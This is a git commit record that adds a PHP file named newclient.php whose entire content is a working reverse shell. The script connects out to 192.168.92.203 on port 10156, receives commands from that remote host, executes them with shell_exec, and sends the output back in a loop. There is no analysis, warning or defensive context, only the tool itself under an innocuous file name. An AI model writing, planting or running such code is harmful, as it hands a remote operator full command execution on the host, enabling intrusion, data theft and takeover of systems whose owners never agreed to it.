ce237263a40967d470145b6a09610c09246b7ee2
cyber communinty <74042135+ankit637@users.noreply.github.com>
2023-10-21 23:49:20 +0530

    newclient.php

---
+++ newclient.php
@@ -0,0 +1,30 @@
+<?php
+$host = '192.168.92.203';
+$port = 10156;
+
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($socket, $host, $port);
+
+while (true) {
+    $command = socket_read($socket, 1024);
+    if (strtolower($command) == 'exit') {
+        break;
+    }
+
+    $output = '';
+    if (strtolower(substr($command, 0, 3)) == 'cd ') {
+        $new_directory = trim(substr($command, 3));
+        if ($new_directory[0] == '/') {
+            chdir($new_directory);
+        } else {
+            chdir(getcwd() . '/' . $new_directory);
+        }
+        $output = 'Changed directory';
+    } else {
+        $output = shell_exec($command);
+    }
+    socket_write($socket, $output, strlen($output));
+}
+
+socket_close($socket);
+?>
